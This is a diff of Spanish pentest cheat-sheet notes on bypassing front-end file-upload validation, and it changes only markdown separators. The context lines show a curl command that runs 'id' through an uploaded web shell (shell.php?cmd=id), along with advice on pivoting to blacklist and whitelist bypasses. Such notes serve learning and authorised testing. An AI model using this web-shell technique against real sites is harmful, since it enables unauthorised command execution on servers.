@@ -10,7 +10,7 @@ linked:
 ---
 # File Upload - Desactivación de Validación Front-end
 
-***
+---
 
 ## Cheatsheet
 
@@ -53,7 +53,7 @@ curl -s https://target/profile | grep -oE 'src="/uploads/[^"]+'
 curl 'https://target/uploads/shell.php?cmd=id'
 ```
 
-___
+---
 
 ## Overview
 
@@ -67,4 +67,4 @@ DevTools es útil cuando MitM HTTPS es problemático (cert pinning, CORS strict)
 
 Si ESTO funciona → la app NO valida en backend = vulnerable. Si frontend bypass falla con error del servidor = hay validación backend → pivotar a [[File Upload - Bypass de Filtros de Lista Negra]]/[[File Upload - Bypass de Filtros de Lista Blanca]].
 
-***
+---
